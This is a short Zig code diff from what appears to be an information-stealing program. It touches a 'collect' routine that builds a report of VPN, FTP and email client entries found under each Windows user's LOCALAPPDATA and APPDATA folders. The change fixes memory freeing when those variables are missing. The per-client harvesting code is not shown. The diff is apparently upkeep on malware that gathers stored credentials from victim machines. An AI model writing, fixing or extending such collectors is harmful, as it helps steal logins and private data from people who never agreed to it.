@@ -169,10 +169,12 @@ pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
 
     try w.print("=== VPN Clients ===\n", .{});
     {
-        const local = std.process.getEnvVarOwned(allocator, "LOCALAPPDATA") catch "";
-        defer if (local.len > 0) allocator.free(local);
-        const roaming = std.process.getEnvVarOwned(allocator, "APPDATA") catch "";
-        defer if (roaming.len > 0) allocator.free(roaming);
+        var f_local = true;
+        var f_roam = true;
+        const local = std.process.getEnvVarOwned(allocator, "LOCALAPPDATA") catch blk: { f_local = false; break :blk ""; };
+        defer if (f_local) allocator.free(local);
+        const roaming = std.process.getEnvVarOwned(allocator, "APPDATA") catch blk: { f_roam = false; break :blk ""; };
+        defer if (f_roam) allocator.free(roaming);
 
         const entries = vpn.collect(allocator, local, roaming) catch {
             try w.print("  None found\n\n", .{});
@@ -197,10 +199,12 @@ pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
 
     try w.print("=== FTP Clients ===\n", .{});
     {
-        const local = std.process.getEnvVarOwned(allocator, "LOCALAPPDATA") catch "";
-        defer if (local.len > 0) allocator.free(local);
-        const roaming = std.process.getEnvVarOwned(allocator, "APPDATA") catch "";
-        defer if (roaming.len > 0) allocator.free(roaming);
+        var f_local_ftp = true;
+        var f_roam_ftp = true;
+        const local = std.process.getEnvVarOwned(allocator, "LOCALAPPDATA") catch blk: { f_local_ftp = false; break :blk ""; };
+        defer if (f_local_ftp) allocator.free(local);
+        const roaming = std.process.getEnvVarOwned(allocator, "APPDATA") catch blk: { f_roam_ftp = false; break :blk ""; };
+        defer if (f_roam_ftp) allocator.free(roaming);
 
         const entries = ftp.collect(allocator, local, roaming) catch {
             try w.print("  None found\n\n", .{});
@@ -225,10 +229,12 @@ pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
 
     try w.print("=== Email Clients ===\n", .{});
     {
-        const local = std.process.getEnvVarOwned(allocator, "LOCALAPPDATA") catch "";
-        defer if (local.len > 0) allocator.free(local);
-        const roaming = std.process.getEnvVarOwned(allocator, "APPDATA") catch "";
-        defer if (roaming.len > 0) allocator.free(roaming);
+        var f_local_email = true;
+        var f_roam_email = true;
+        const local = std.process.getEnvVarOwned(allocator, "LOCALAPPDATA") catch blk: { f_local_email = false; break :blk ""; };
+        defer if (f_local_email) allocator.free(local);
+        const roaming = std.process.getEnvVarOwned(allocator, "APPDATA") catch blk: { f_roam_email = false; break :blk ""; };
+        defer if (f_roam_email) allocator.free(roaming);
 
         const entries = email.collect(allocator, local, roaming) catch {
             try w.print("  None found\n\n", .{});
